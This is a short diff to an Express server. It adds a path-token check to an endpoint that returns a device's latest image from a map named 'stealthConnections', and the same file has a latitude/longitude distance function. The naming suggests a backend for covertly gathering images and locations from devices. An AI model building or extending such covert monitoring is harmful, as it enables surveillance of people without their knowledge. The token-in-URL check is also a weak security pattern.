@@ -442,8 +442,13 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
   }
 });
 
-app.get('/api/device/:deviceId/latest-image', (req, res) => {
-  const deviceId = req.params.deviceId;
+app.get('/api/device/:deviceId/latest-image/:token', (req, res) => {
+  const { deviceId, token } = req.params;
+  
+  if (token !== SECRET_TOKEN) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  
   const deviceInfo = stealthConnections.get(deviceId);
   
   if (deviceInfo && deviceInfo.latestImage) {
@@ -510,3 +515,4 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
